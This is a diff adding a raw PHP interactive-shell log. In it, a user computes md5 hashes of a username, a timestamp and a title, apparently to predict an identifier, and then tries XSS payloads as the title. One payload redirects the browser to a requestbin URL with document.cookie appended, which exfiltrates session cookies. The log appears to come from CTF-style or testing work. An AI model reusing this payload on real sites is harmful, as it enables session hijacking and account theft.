@@ -1,0 +1,99 @@
+Interactive mode enabled
+
+php > $created_at = date("Y/m/d H:i");
+php > date("Y/m/d H:i");
+php > $a = date("Y/m/d H:i");
+php > print($a);
+2019/05/26 07:58
+php > print($a);
+2019/05/26 07:58
+php > print($a);
+2019/05/26 07:58
+php >
+php > print($a);
+2019/05/26 07:58
+php > md5($username . $created_at . $title);
+PHP Notice:  Undefined variable: username in php shell code on line 1
+PHP Notice:  Undefined variable: title in php shell code on line 1
+php > $username = 'hogepiyoco'
+php > $created_at = '2019/05/26 07:22'
+php > $title = 'aa';
+PHP Parse error:  syntax error, unexpected '$created_at' (T_VARIABLE) in php shell code on line 2
+php > $title = 'aa'
+php > md5($username . $created_at . $title);
+PHP Parse error:  syntax error, unexpected 'md5' (T_STRING) in php shell code on line 2
+php > md5($username . $created_at . $title)
+php > print(md5($username . $created_at . $title))
+php > printf('A')
+php > print('A')
+php > print('A');
+PHP Parse error:  syntax error, unexpected 'print' (T_PRINT) in php shell code on line 2
+php > ;
+php > ;
+php > ;
+php > ;
+php > ;
+php > ;
+php > ;
+php > print('A');
+A
+php > print('A');
+A
+php > print('A');
+A
+php > print('A');
+A
+php > print(md5($username . $created_at . $title));
+PHP Notice:  Undefined variable: username in php shell code on line 1
+PHP Notice:  Undefined variable: title in php shell code on line 1
+e1aab2ccbcb7efca483dc65a083faf82
+php > $username = 'hogepiyoco';php > print(md5($username . $created_at . $title));
+PHP Notice:  Undefined variable: title in php shell code on line 1
+a44a5d68342e2c8b49f73d9271fcc04f
+php > $created_at = '2019/05/26 07:22';                                                                                                              php > print(md5($username . $created_at . $title));
+PHP Notice:  Undefined variable: title in php shell code on line 1
+face14f0f62a4ba752d337145b38927a
+php > function compress($arr) {.>
+php {
+php {
+php { }
+PHP Parse error:  syntax error, unexpected '.' in php shell code on line 1
+php >
+php >
+php > $created_at = '2019/05/26 07:22';                                                                                                              php > print(md5($username . $created_at . $title));
+PHP Notice:  Undefined variable: title in php shell code on line 1
+face14f0f62a4ba752d337145b38927a
+php > print($username);
+hogepiyoco
+php > print($created_at);
+2019/05/26 07:22
+php > print($title);
+PHP Notice:  Undefined variable: title in php shell code on line 1
+php > $title = 'aa';                                                                                                                                                 php > print(md5($username . $created_at . $title));
+ac1fa2d1b9cb8f1d69ff03519e42ff74
+php > $title = '<script>alert(1);</script>';
+php > print(md5($username . $created_at . $title));
+8fdaefdc5a3e5aef6970207f80a89389
+php > $created_at = '2019/05/26 08:07';
+php > print(md5($username . $created_at . $title));
+fef45f76fa94ca02648ba0945b2baf26
+php >
+php >
+php > $title = <script>window.location='https://requestbin.fullcontact.com/1d749na1?'+document.cookie;</script>;
+PHP Parse error:  syntax error, unexpected '<' in php shell code on line 1
+php > $title = "<script>window.location='https://requestbin.fullcontact.com/1d749na1?'+document.cookie;</script>;"
+php > print($title);
+PHP Parse error:  syntax error, unexpected 'print' (T_PRINT) in php shell code on line 2
+php > $title;
+php > print($title);
+<script>alert(1);</script>
+php > print($title);
+<script>alert(1);</script>
+php > $title = "<script>window.location='https://requestbin.fullcontact.com/1d749na1?'+document.cookie;</script>;";
+php >
+php >
+php > print($title);
+<script>window.location='https://requestbin.fullcontact.com/1d749na1?'+document.cookie;</script>;
+php > $created_at = '2019/05/26 08:14';
+php > print(md5($username . $created_at . $title));
+6493685136bef3a3d23da02f205a2c8e
